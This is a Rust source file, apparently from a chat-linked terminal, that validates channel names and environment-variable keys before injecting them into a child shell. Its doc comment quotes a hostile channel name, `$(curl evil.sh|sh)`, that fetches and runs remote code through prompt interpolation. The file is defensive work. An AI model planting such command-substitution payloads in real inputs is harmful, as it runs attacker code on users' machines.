//! GUI context injected into the child shell.
//!
//! The terminal knows which channel and thread the user is looking at, so a
//! script in the substrate can act on it. That context crosses a trust
//! boundary: a channel *name* is attacker-controlled — anyone who can create
//! a channel picks the string — and it lands in an environment variable that
//! shells interpolate into prompts. A `PS1` containing `$BUZZ_CHANNEL` turns a
//! channel named `$(curl evil.sh|sh)` into command execution the moment the
//! user opens a terminal.
//!
//! Two rules follow, and the second one is the load-bearing one:
//!
//! 1. **Validate, don't sanitize.** Stripping dangerous characters is an
//!    endless negotiation with an attacker who chooses the input. We accept a
//!    conservative character class and reject everything else.
//! 2. **On rejection, substitute — never strip.** A stripped name is still a
//!    name, and it is *wrong* in a way the user cannot see: `$(evil)` becomes
//!    `evil`, which looks like a real channel. We substitute the channel UUID,
//!    which is unambiguous, always safe, and visibly not a name — the user can
//!    tell something was replaced.

/// Maximum accepted channel-name length, in characters.
const MAX_CHANNEL_NAME_CHARS: usize = 64;

/// The GUI state a spawned terminal is told about.
#[derive(Debug, Clone)]
pub struct GuiContext {
    pub channel_id: String,
    pub channel_name: String,
    pub thread_id: Option<String>,
    pub npub: String,
    pub relay_url: String,
    pub session_id: String,
}

/// Returns true if `name` is safe to expose as `BUZZ_CHANNEL`.
///
/// Unicode letters, digits and marks are accepted so non-Latin channel names
/// survive, plus space and `-`/`_`/`.`. Everything a shell gives meaning to —
/// `$`, backtick, `;`, `|`, `&`, quotes, newline, NUL, `=` — is outside the
/// class and therefore rejected rather than removed.
fn is_safe_channel_name(name: &str) -> bool {
    !name.is_empty()
        && name.chars().count() <= MAX_CHANNEL_NAME_CHARS
        && name
            .chars()
            .all(|c| c.is_alphanumeric() || matches!(c, ' ' | '-' | '_' | '.'))
}

/// The value to expose as `BUZZ_CHANNEL`: the name when it is safe, otherwise
/// the channel UUID.
pub fn channel_display(context: &GuiContext) -> &str {
    if is_safe_channel_name(&context.channel_name) {
        &context.channel_name
    } else {
        &context.channel_id
    }
}

/// Returns true if `key` is a well-formed POSIX env var name:
/// `[A-Za-z_][A-Za-z0-9_]*`.
///
/// Mirrors `is_well_formed_env_key` in the desktop crate
/// (`src/managed_agents/env_vars.rs`), whose rationale applies verbatim here:
/// `CommandBuilder::env` will pass a key containing `=` straight into the
/// child's environ block, where `getenv("FOO")` matches whatever follows the
/// first `=`. A key `BUZZ_CHANNEL=x` with value `y` lands as
/// `BUZZ_CHANNEL=x=y`, so `getenv("BUZZ_CHANNEL")` returns `"x=y"` — a way to
/// forge a variable the fence otherwise controls.
///
/// Every key we inject is a compile-time literal today, so this cannot fire
/// yet. It is here because the *next* injected key may not be: the check
/// belongs at the boundary, not in the reviewer's memory.
pub fn is_well_formed_env_key(key: &str) -> bool {
    let mut chars = key.chars();
    match chars.next() {
        Some(c) if c == '_' || c.is_ascii_alphabetic() => {}
        _ => return false,
    }
    chars.all(|c| c == '_' || c.is_ascii_alphanumeric())
}

/// The context variables to inject, in order.
///
/// `BUZZ_CHANNEL` carries the validated display value; `BUZZ_CHANNEL_ID` is
/// always the UUID, so a script that needs an unambiguous identifier has one
/// that no channel name can spoof.
pub fn context_vars(context: &GuiContext) -> Vec<(&'static str, String)> {
    let mut vars = vec![
        ("BUZZ_CHANNEL_ID", context.channel_id.clone()),
        ("BUZZ_CHANNEL", channel_display(context).to_owned()),
        ("BUZZ_NPUB", context.npub.clone()),
        ("BUZZ_RELAY_URL", context.relay_url.clone()),
        ("BUZZ_TERM_SESSION", context.session_id.clone()),
        ("BUZZ_TERM_VERSION", env!("CARGO_PKG_VERSION").to_owned()),
    ];
    // Absent rather than empty when the user is not in a thread: `-n
    // "$BUZZ_THREAD_ID"` and `${BUZZ_THREAD_ID+set}` should agree.
    if let Some(thread_id) = &context.thread_id {
        vars.push(("BUZZ_THREAD_ID", thread_id.clone()));
    }
    vars
}
